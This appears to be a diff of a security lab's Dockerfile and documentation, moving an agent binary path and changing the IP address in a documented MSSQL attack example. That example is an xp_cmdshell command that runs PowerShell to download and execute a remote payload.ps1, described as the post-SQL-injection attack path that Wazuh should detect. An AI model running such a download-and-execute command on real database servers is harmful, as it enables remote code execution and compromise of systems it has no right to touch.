@@ -54,8 +54,8 @@ RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add - && \
     apt-get update && apt-get install -y wazuh-agent=${WAZUH_VERSION}-1
 
 # Saffron agent
-COPY saffron-agent-linux-amd64 /usr/local/bin/saffron-agent
-RUN chmod +x /usr/local/bin/saffron-agent
+COPY saffron-agent-linux-amd64 /usr/bin/saffron-agent
+RUN chmod +x /usr/bin/saffron-agent
 
 # SSH
 RUN mkdir /var/run/sshd && \
@@ -191,7 +191,7 @@ GO
 
 ```sql
 -- Attacker achieves this after SQL injection + SA auth
-EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://9.53.99.1/payload.ps1'')"'
+EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://5.79.99.1/payload.ps1'')"'
 ```
 
 This is the attack path for MSSQL-based RCE scenarios. Wazuh on db01 should alert on `xp_cmdshell` execution (SQL Server audit log event).
